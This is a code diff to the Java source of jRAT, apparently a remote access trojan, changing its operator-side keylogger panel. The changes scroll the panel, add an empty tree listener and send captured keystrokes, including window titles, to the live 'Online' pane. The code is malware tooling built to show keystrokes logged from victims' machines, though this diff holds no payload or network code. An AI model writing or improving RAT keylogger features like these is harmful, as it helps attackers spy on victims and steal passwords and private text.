@@ -30,6 +30,8 @@ import pro.jrat.api.PacketBuilder;
 import pro.jrat.api.RATObject;
 import pro.jrat.plugin.client.HeartbeatThread;
 import pro.jrat.plugin.client.KeyloggerPlugin;
+import javax.swing.event.TreeSelectionListener;
+import javax.swing.event.TreeSelectionEvent;
 
 
 @SuppressWarnings("serial")
@@ -128,6 +130,8 @@ public class PanelKeylogger extends BaseControlPanel {
 		}
 		
 		JScrollPane onlineScrollPane = new JScrollPane();
+		onlineScrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
+		onlineScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
 		tabbedPane.addTab("Online", onlineIcon, onlineScrollPane, null);
 		
 		onlineTextPane = new JTextPane();
@@ -137,12 +141,14 @@ public class PanelKeylogger extends BaseControlPanel {
 		onlineTextPane.addStyle("title", title);
 
 		tree = new JTree();
+		tree.addTreeSelectionListener(new TreeSelectionListener() {
+			public void valueChanged(TreeSelectionEvent arg0) {
+				
+			}
+		});
 		tree.setShowsRootHandles(true);
 		tree.setModel(new DefaultTreeModel(
-			new DefaultMutableTreeNode("Dates") {
-				{
-				}
-			}
+			new DefaultMutableTreeNode("Dates")
 		));
 		scrollPane_1.setViewportView(tree);
 		setLayout(groupLayout);
@@ -179,17 +185,17 @@ public class PanelKeylogger extends BaseControlPanel {
 				delete();
 				return;
 			} else if (key.startsWith("[Window")) {
-				offlineTextPane.getStyledDocument().insertString(offlineTextPane.getStyledDocument().getLength(), "\n\r" + key + "\n\r", title);
+				onlineTextPane.getStyledDocument().insertString(onlineTextPane.getStyledDocument().getLength(), "\n\r" + key + "\n\r", title);
 			} else {
-				offlineTextPane.getStyledDocument().insertString(offlineTextPane.getStyledDocument().getLength(), key.length() == 1 ? key : key + " ", null);
+				onlineTextPane.getStyledDocument().insertString(onlineTextPane.getStyledDocument().getLength(), key.length() == 1 ? key : key + " ", null);
 			}
 			
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
 		
-		offlineTextPane.setSelectionStart(offlineTextPane.getDocument().getLength());
-		offlineTextPane.setSelectionEnd(offlineTextPane.getDocument().getLength());	
+		onlineTextPane.setSelectionStart(onlineTextPane.getDocument().getLength());
+		onlineTextPane.setSelectionEnd(onlineTextPane.getDocument().getLength());	
 
 	}
 
